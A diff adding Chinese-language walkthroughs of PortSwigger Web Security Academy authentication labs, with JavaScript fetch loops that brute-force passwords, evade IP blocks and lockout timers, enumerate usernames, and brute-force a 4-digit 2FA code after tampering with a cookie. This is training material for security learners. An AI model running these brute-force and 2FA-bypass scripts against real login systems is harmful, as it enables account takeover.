@@ -391,6 +391,218 @@ async function main() {
 
 這題的重點是，在爆破 username 的時候，記得 password 用長一點的，才可以把時間差異擴大
 
+## Lab: Broken brute-force protection, IP block
+
+| Dimension | Description                                                                                                  |
+| --------- | ------------------------------------------------------------------------------------------------------------ |
+| Document  | https://portswigger.net/web-security/authentication/password-based#flawed-brute-force-protection             |
+| Lab       | https://portswigger.net/web-security/authentication/password-based/lab-broken-bruteforce-protection-ip-block |
+
+```js
+function loginWiener() {
+  fetch(
+    "https://0a7a00c20376c23880502121006a0043.web-security-academy.net/login",
+    {
+      headers: {
+        "content-type": "application/x-www-form-urlencoded",
+      },
+      body: "username=wiener&password=peter",
+      method: "POST",
+      mode: "cors",
+      credentials: "include",
+    },
+  );
+}
+
+async function main() {
+  for (const password of passwords) {
+    const response = await login("carlos", password);
+    // custom logic here
+    const isCorrect = response.redirected;
+    if (isCorrect) return console.log(password);
+    await loginWiener();
+  }
+}
+```
+
+## Lab: Username enumeration via account lock
+
+| Dimension | Description                                                                                                  |
+| --------- | ------------------------------------------------------------------------------------------------------------ |
+| Document  | https://portswigger.net/web-security/authentication/password-based#account-locking                           |
+| Lab       | https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-account-lock |
+
+測試同一個 valid 帳號連續錯誤 5 次就會鎖
+
+```js
+async function main() {
+  for (const username of usernames) {
+    for (const password of passwords.slice(0, 1)) {
+      await login(username, password);
+      await login(username, password);
+      await login(username, password);
+      await login(username, password);
+      const response = await login(username, password);
+      // custom logic here
+      const text = await response.text();
+      const isInvalid = text.includes("Invalid username or password.");
+      console.log({ username, password, isInvalid });
+      if (!isInvalid) {
+        console.log(username, "isValid");
+        return;
+      }
+    }
+  }
+}
+```
+
+來猜密碼
+
+```js
+async function main() {
+  for (const username of ["agenda"]) {
+    for (const password of passwords) {
+      const response = await login(username, password);
+      // custom logic here
+      const text = await response.text();
+      const isInvalid = text.includes("Invalid username or password.");
+      console.log({ username, password, isInvalid });
+      if (!isInvalid) {
+        console.log(username, "isValid");
+        return;
+      }
+    }
+  }
+}
+```
+
+第 4 次的時候停下來了，錯誤訊息是
+
+```
+You have made too many incorrect login attempts. Please try again in 1 minute(s).
+```
+
+嘗試加個 sleep，每嘗試 3 次就休息 1 分鐘，雙螢幕的夥伴就可以先把 youtube 打開刷影片了(x)
+
+```js
+function sleep(time) {
+  return new Promise((resolve) => {
+    setTimeout(resolve, time);
+  });
+}
+
+async function main() {
+  let count = 0;
+  for (const username of ["agenda"]) {
+    for (const password of passwords.slice(3)) {
+      const response = await login(username, password);
+      // custom logic here
+      const text = await response.text();
+      const isInvalid = text.includes("Invalid username or password.");
+      count += 1;
+      console.log({ username, password, isInvalid });
+      if (!isInvalid) {
+        console.log(username, "stops");
+        return;
+      }
+      if (count === 3) {
+        count = 0;
+        await sleep(60000);
+      }
+    }
+  }
+}
+```
+
+過了約 30 分鐘，終於在第 95 次嘗試的時候找到答案，感動～
+
+## Lab: Broken brute-force protection, multiple credentials per request
+
+| Dimension | Description                                                                                                                           |
+| --------- | ------------------------------------------------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/authentication/password-based#user-rate-limiting                                                 |
+| Lab       | https://portswigger.net/web-security/authentication/password-based/lab-broken-brute-force-protection-multiple-credentials-per-request |
+
+嘗試第 4 次的時候，看到
+
+```
+You have made too many incorrect login attempts. Please try again in 1 minute(s).
+```
+
+題目說 multiple credentials per request，所幸死馬當活馬醫，直接把所有 passwords 塞進去一個 HTTP Request
+
+```js
+fetch(
+  "https://0a20008604f3a7bf80c0ada400a50066.web-security-academy.net/login",
+  {
+    headers: {
+      "content-type": "application/json",
+    },
+    body: JSON.stringify({
+      username: "carlos",
+      password: passwords,
+    }),
+    method: "POST",
+    mode: "cors",
+    credentials: "include",
+  },
+);
+```
+
+結果就神奇的通關了，是說真的會有後端這樣設計登入流程嗎...
+
+## Lab: 2FA simple bypass
+
+| Dimension | Description                                                                                          |
+| --------- | ---------------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/authentication/multi-factor#bypassing-two-factor-authentication |
+| Lab       | https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-simple-bypass               |
+
+先用 `carlos:montoya` 登入
+
+之後直接進入 https://0a9000cc0485827580ab9e100042008e.web-security-academy.net/my-account?id=carlos 就成功 Bypass
+
+## Lab: 2FA broken logic
+
+| Dimension | Description                                                                                           |
+| --------- | ----------------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/authentication/multi-factor#flawed-two-factor-verification-logic |
+| Lab       | https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic                 |
+
+在 `/login2` 可以發現 `Cookie: verify=wiener`，嘗試將 `wiener` 改成 `carlos`，並且重整頁面，確保有重新發送 4-digit security code
+
+之後就可以開始暴力破解
+
+```js
+const codes = Array(10000)
+  .fill(0)
+  .map((zero, idx) => String(idx).padStart(4, "0"));
+
+function login(code) {
+  return fetch(
+    "https://0ada00380311b61280cc0822004d00f6.web-security-academy.net/login2",
+    {
+      headers: {
+        "content-type": "application/x-www-form-urlencoded",
+      },
+      body: `mfa-code=${code}`,
+      method: "POST",
+      mode: "cors",
+      credentials: "include",
+    },
+  );
+}
+
+async function main() {
+  for (const code of codes) {
+    const response = await login(code);
+    if (response.redirected) return;
+  }
+}
+```
+
+成功在 1630 停下，剛好我也刷完牙了
+
 ## 參考資料
 
 - https://portswigger.net/web-security/authentication
